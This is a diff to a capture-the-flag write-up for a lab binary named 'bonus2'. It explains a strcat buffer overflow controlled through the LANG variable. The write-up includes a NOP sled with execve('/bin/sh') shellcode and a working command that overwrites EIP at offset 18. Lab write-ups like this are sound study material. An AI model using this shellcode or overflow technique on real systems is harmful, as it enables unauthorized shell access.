@@ -1,8 +1,13 @@
+The program takes 2 arguments, the first one is displayed alongside "Hello" in the language of "LANG" env variable.
+It uses a buffer, and concatenates the first 40 bytes of argv[1] and next after it, 32 bytes of argv[2]. Then it concatenates in <greetuser> the buffer with the hello string in the correspondig language.
+It uses strcat and is exploitable, since it tries to concatnate 72 bytes to a 72 bytes long buffer, already initialized with the hello string.
+
+We put our shellcode in the env, and start looking for overflow.
 export POUET=`python -c 'print("\x90"*255 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
 
-(cat;)| LANG=fiffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ./bonus2 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLM $(python -c "print('NNNNOOOOPPPPQQQQRR' + '\x45\xf8\xff\xbf')")
+We find that with the basic language ("en"), we can rewrite $eip, but not completly, after some tests, setting LANG to fi solves this problem, since "Hyvää päivää" is longer than "hello".
+The second argument is overflowable, and the offset to reach $eip is 18.
 
 
+(cat;)| LANG=fi ./bonus2 $(python -c "print('A'*40)") $(python -c "print('A'*18 + '\x45\xf8\xff\xbf')")
 
-
--------------------> ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
